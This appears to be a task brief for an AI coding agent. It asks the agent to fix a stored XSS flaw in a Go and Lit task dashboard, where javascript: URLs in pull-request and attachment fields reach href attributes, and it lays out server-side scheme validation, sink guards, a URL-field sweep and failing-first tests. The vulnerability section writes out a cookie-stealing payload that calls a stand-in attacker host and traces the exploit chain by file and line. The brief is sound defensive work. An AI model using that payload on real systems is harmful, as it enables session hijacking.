# dev-xss-url — stored `javascript:` XSS via task URL fields

Your working tree is `/workspace`. Confirm with `git rev-parse --show-toplevel`, and verify
branch `url-scheme-validation` and commit **`7a0f220dbd9332cb8db62138c841777432b4eda4`**.
**Do NOT create any directory named in this brief.**

**This base is `origin/main` — the code that is LIVE IN PRODUCTION.** That is deliberate: the
vulnerability is in production, and this fix must be mergeable and deployable on its own, without
waiting for two other in-flight workstreams. **Do not merge, rebase onto, or cherry-pick from any
other branch.** Two other rounds are running in `internal/server/server.go`; a mechanical conflict
at merge time is expected and is my problem, not yours.

`web/dist` and `web/node_modules` are present and gitignored. **Leave them.** `go build` fails
with `pattern all:web/dist: no matching files found` without `web/dist` `[MEASURED by me]`.

## Baseline `[MEASURED by me at 7a0f220 in this exact clone]`

| check | result |
|---|---|
| `go build ./...` | exit 0 |
| `go test ./...` | **10 packages ok, 0 FAIL lines** |
| `go vet ./...` | exit 1, **exactly 4** copylocks in `internal/server/server.go`, `assignment copies lock value to ephReq: …contains sync.Mutex` |
| `git status --porcelain` | empty |

Those 4 vet findings are pre-existing and expected. Compare **messages and line numbers**, not the
count. **There is no CI on this project** — nothing downstream catches what you miss.

`internal/server` has a `TestWatchTasks*` flake at roughly **8% per full-suite run**
`[MEASURED-BY-test-194-r8]`. If you see a `TestWatchTasks*` failure, re-run before believing it,
and always check failing test **names**, not counts.

## How to treat this brief

Tags: `[MEASURED]` = I ran it this session. `[MEASURED-BY-<leg>]` = relayed, re-measure before
relying on it. `[BELIEVED]` = neither.

**My briefs have contained at least one error in eleven consecutive rounds.** Listing every place
this brief is wrong is a **required deliverable**. Legs that route around my hints consistently
find better things than the hints.

**One error in this brief already, and it is instructive:** my first probe for the sink reported
`SINK NOT AT THIS BASE`. That was **false** — my grep pattern was broken, not the tree. I caught it
by re-running with a different pattern and a comparison tree. Had I trusted a single negative probe
with no positive control, I would have reported that a live XSS was not in production. **Treat
every negative result you get here the same way: a negative needs a positive control.**

---

# The vulnerability

**Stored XSS, exploitable today, in production.** Found by `audit-194-r8`; independently confirmed
by the coordinator and by me.

A caller holding only `task:write` submits a task URL field whose value is
`javascript:fetch('//attacker/'+document.cookie)`. It is persisted verbatim, returned verbatim, and
rendered directly into an `href` in the dashboard. A user who opens the task inspector and clicks
the link executes attacker script in the dashboard origin with their session.

**This is not covered by IAP.** IAP governs who gets in; here the attacker and the victim are both
already inside that boundary, and the attack travels through content the attacker legitimately
wrote.

## The chain `[MEASURED-BY-audit-194-r8; the sink and the two zero-counts re-measured by me at 7a0f220]`

| stage | location |
|---|---|
| ingress, unvalidated | `internal/server/server.go:922-928` → `store.PullRequestParam{URL: pr.GetUrl()}` |
| persisted verbatim | `internal/store/entstore.go:933-943` |
| egress | `internal/server/convert.go:340-345` |
| **sink** | `web/src/components/inspector/ft-inspector-code.ts:106` |

The sink, verbatim at this base `[MEASURED by me]`:

```
<a class="pr-link" href=${pr.url} target="_blank" rel="noopener">${pr.id}</a>
```

## Why nothing currently stops it

- **Zero `url.Parse` anywhere in `internal/server/`** `[MEASURED by me: count = 0]`.
- **`protovalidate` is declared and never invoked.** The proto declares
  `[(buf.validate.field).string.uri = true]` on **two** fields — `PullRequest.url` and
  `Attachment.url`. There are **zero** references to protovalidate in `cmd/` or `internal/`
  `[MEASURED by me: 0 files]`. The coordinator independently confirmed it is imported, in
  `go.mod`, and in the generated `pb.go`, but never called. **The constraint is decorative.**
- **Even if it were enforced, `uri = true` would not help** — `javascript:alert(1)` is a
  well-formed URI under RFC 3986. Do not "fix" this by wiring up protovalidate and stopping.
- **Lit does not sanitize `href`.** No `setSanitizer` anywhere in `web/src`.

---

# MUST 1 — validate the URL scheme at the write boundary (this is the fix)

Reject any URL that is not `http` or `https` at ingress, before persistence, for **both** URL
fields — `PullRequest.url` and `Attachment.url`. Do not fix only the one the auditor traced.

Requirements:

- **Parse, do not pattern-match.** A denylist of `javascript:` is the wrong shape — `data:`,
  `vbscript:`, and embedded credentials are all in the same open set. **Allow-list `http` and
  `https` and reject everything else.** When a hazard is open-set, the fix is a chokepoint, not a
  checklist.
- Consider whether scheme comparison needs case-folding and whitespace/control-character trimming
  before parsing (`JaVaScRiPt:`, leading `\t`/newline). **Measure what your chosen parser does with
  these rather than assuming** — and report what you measured.
- Return a clear `InvalidArgument` naming the field and the accepted schemes.
- **Put the check where BOTH paths reach it.** There is a known measurement hazard here: the CLI
  pass-through registers gRPC with **no interceptor**, so a validation wired only as an interceptor
  would be present on one path and absent on the other, and a test passing on the server path would
  prove nothing about the CLI path `[MEASURED-BY-audit-194-r8, finding I-2]`. **Say explicitly in
  your report which paths your fix covers and how you established that.**

# MUST 2 — defence in depth at the sink, for rows already in the database

The server fix does nothing about malicious URLs **already persisted**. Guard the render path too.

There are exactly **three** interpolated `href` bindings in `web/src` `[MEASURED by me at 7a0f220]`:

| file:line | binding | state |
|---|---|---|
| `web/src/components/inspector/ft-inspector-code.ts:106` | `href=${pr.url}` | **unguarded** |
| `web/src/components/inspector/ft-inspector-meta.ts:611` | `href=${t.remoteUrl}` | **unguarded** |
| `web/src/components/ft-toolbar.ts:465` | `href=${url}` | guarded at `:461-465` `[MEASURED-BY-audit-194-r8]` — **verify this yourself and reuse the pattern** |

Apply the existing guard pattern to the two unguarded bindings. Prefer factoring the guard into one
shared helper that all three call, rather than three copies — **a guard that is a copy of another
guard is this project's most-repeated defect**, and three inline copies will drift.

# MUST 3 — sweep for other unvalidated URI fields feeding `href`/`src`

Explicitly requested by the coordinator: *"check for other unvalidated URI fields feeding into
href/src bindings across the frontend while they're in there, not just the one sink."*

Two independent audits on two unrelated workstreams both landed on href sinks tonight. Treat that
as signal.

- Enumerate **every** `href` and `src` binding in `web/src`, and every proto field that is
  URL-shaped (whether or not it declares a `uri` constraint).
- **Report the denominator.** How many bindings exist, how many you inspected, how many are
  guarded. A count without a denominator is a confirmed lower bound wearing a measurement's
  clothes. **I expect the sweep to find few or no additional live sinks — a clean result is a
  required reported outcome, not a non-event.**
- If the sweep is genuinely open-ended, say where you stopped and why, rather than implying
  completeness.

# MUST 4 — pins that actually fail

For each of MUST 1 and MUST 2, add a regression test and **prove it fails without the fix**:
revert your change, show the test RED, restore, show it GREEN. Report the **names** of the failing
tests, not just counts.

At minimum:
- server-side: `javascript:` payload on both URL fields is rejected; `http`/`https` still accepted.
- client-side: a persisted `javascript:` URL does not reach the `href` attribute.

**Do not assert only on the happy path.** The whole finding is that a declared constraint existed
and nothing invoked it — a test that only checks valid URLs still pass would have caught none of
this.

---

# Verification bars

- **Exit codes come from the child process, never through a pipe.**
- **A negative claim needs a positive control** — including mine above, which failed exactly this way.
- **Predict counts before measuring** and report the prediction next to the result.
- **A green control is a finding.** Write it down.
- Revert every experiment; assert `git diff --quiet` afterwards.

# Deliverables — you are not done until all five exist

1. **Commits on `url-scheme-validation`.** Clear messages. **Never push.**
2. **A report at `/scion-volumes/scratchpad/projects/farmtable/reports/dev-xss-url.md`** — the fix,
   the paths it covers, your RED-then-GREEN evidence per pin with failing test names, and the MUST 3
   sweep **with its denominator**.
3. **A project log entry** in `.design/project-log/`, **committed**.
4. **An explicit list of every place this brief was wrong.** If nothing, say so and say what you checked.
5. **Final gates**, child-process exit codes: `go build ./...` = 0, `go test ./...` = 0 with zero
   FAIL lines, `go vet ./...` = 1 with the **same 4** copylocks, `npm test` / `tsc --noEmit` /
   `npm run build` in `web/` all 0, `git status --porcelain` empty.

**You MUST produce all five deliverables and then mark the task complete.**

**Do NOT push.** Pushing is the manager's job and mine alone.
